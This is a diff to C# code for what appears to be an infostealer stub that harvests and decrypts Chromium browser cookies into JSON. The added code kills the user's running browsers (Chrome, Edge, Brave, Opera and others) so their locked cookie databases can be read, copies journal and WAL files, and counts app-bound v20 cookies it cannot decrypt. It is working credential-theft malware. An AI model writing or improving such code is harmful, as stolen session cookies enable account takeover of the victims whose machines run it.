@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
@@ -53,6 +54,17 @@ namespace Stub
             try
             {
                 jar = Collector.Collect();
+
+                // a running browser holds its cookie store exclusively, so the
+                // first pass can come back with nothing. close them and retry.
+                if (Collector.StoreLocked)
+                {
+                    Collector.FreeStores();
+                    CookieJar second = Collector.Collect();
+                    if (second.Count >= jar.Count)
+                        jar = second;
+                }
+
                 json = jar.ToJson();
             }
             catch (Exception ex)
@@ -61,6 +73,10 @@ namespace Stub
                     Console.WriteLine("collect failed: " + ex.Message);
                 return;
             }
+
+            // carry the skip count so an empty capture says why it is empty
+            if (Collector.V20Skipped > 0 && json.Length > 1)
+                json = json.Substring(0, json.Length - 1) + ",\"skipped\":" + Collector.V20Skipped + "}";
 
             if (selfTest)
             {
@@ -204,8 +220,70 @@ namespace Stub
         private const int MaxCookiesPerStore = 4000;
         private const long MaxDbBytes = 96L * 1024 * 1024;
 
+        // how long a browser gets to close its windows before it is terminated
+        private const int GracefulMs = 1500;
+
+        // time for the OS to drop the file handles once the process is gone
+        private const int SettleMs = 900;
+
+        /// <summary>
+        /// True when a cookie store could not be opened because the browser was
+        /// holding it - current Chromium opens its cookie database exclusively,
+        /// so nothing can read it while the browser runs.
+        /// </summary>
+        public static bool StoreLocked;
+
+        /// <summary>
+        /// Asks every known browser to close, then terminates whatever is left.
+        /// Chromium and Firefox both keep their cookie stores locked while
+        /// running, so this is the only way to read them without elevation.
+        /// </summary>
+        public static void FreeStores()
+        {
+            string[] names = { "chrome", "msedge", "brave", "vivaldi", "opera", "yandex" };
+            List<Process> targets = new List<Process>();
+
+            foreach (string name in names)
+            {
+                try
+                {
+                    foreach (Process p in Process.GetProcessesByName(name))
+                        targets.Add(p);
+                }
+                catch { }
+            }
+
+            if (targets.Count == 0)
+                return;
+
+            foreach (Process p in targets)
+            {
+                try { p.CloseMainWindow(); }
+                catch { }
+            }
+
+            Thread.Sleep(GracefulMs);
+
+            foreach (Process p in targets)
+            {
+                try { if (!p.HasExited) p.Kill(); }
+                catch { }
+            }
+
+            Thread.Sleep(SettleMs);
+        }
+
+        /// <summary>
+        /// Cookies stored as v20 (Chromium 127+ app-bound encryption). Those
+        /// values cannot be unwrapped without Chrome's elevation service, so
+        /// they are counted and skipped instead of being reported as garbage.
+        /// </summary>
+        public static int V20Skipped;
+
         public static CookieJar Collect()
         {
+            StoreLocked = false;
+            V20Skipped = 0;
             CookieJar jar = new CookieJar();
             string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -341,6 +419,13 @@ namespace Stub
 
             try
             {
+                // v20: app-bound, the key is not reachable from a user process
+                if (blob.Length > 31 && blob[0] == (byte)'v' && blob[1] == (byte)'2' && blob[2] == (byte)'0')
+                {
+                    V20Skipped++;
+                    return "";
+                }
+
                 // v10 / v11: 3 byte prefix + 12 byte nonce + ciphertext + 16 byte tag
                 if (blob.Length > 31 && blob[0] == (byte)'v' && blob[1] == (byte)'1' &&
                     (blob[2] == (byte)'0' || blob[2] == (byte)'1') && key != null && key.Length == 32)
@@ -517,18 +602,51 @@ namespace Stub
                             output.Write(buffer, 0, read);
                     }
                 }
+
+                // a hard kill can leave a hot journal behind; carry it across so
+                // SQLite can roll the copy back instead of reading torn pages
+                CopySidecar(source, dest, "-journal");
+                CopySidecar(source, dest, "-wal");
                 return dest;
             }
             catch
             {
+                StoreLocked = true;
                 return null;
             }
         }
 
+        private static void CopySidecar(string source, string dest, string suffix)
+        {
+            try
+            {
+                string from = source + suffix;
+                if (!File.Exists(from))
+                    return;
+
+                using (FileStream input = new FileStream(from, FileMode.Open, FileAccess.Read,
+                           FileShare.ReadWrite | FileShare.Delete))
+                using (FileStream output = new FileStream(dest + suffix, FileMode.Create, FileAccess.Write, FileShare.None))
+                {
+                    byte[] buffer = new byte[32 * 1024];
+                    int read;
+                    while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
+                        output.Write(buffer, 0, read);
+                }
+            }
+            catch { }
+        }
+
         private static void TryDelete(string path)
         {
-            try { if (path != null && File.Exists(path)) File.Delete(path); }
-            catch { }
+            if (path == null)
+                return;
+
+            foreach (string suffix in new string[] { "", "-journal", "-wal", "-shm" })
+            {
+                try { if (File.Exists(path + suffix)) File.Delete(path + suffix); }
+                catch { }
+            }
         }
 
         private static string ReadShared(string path)
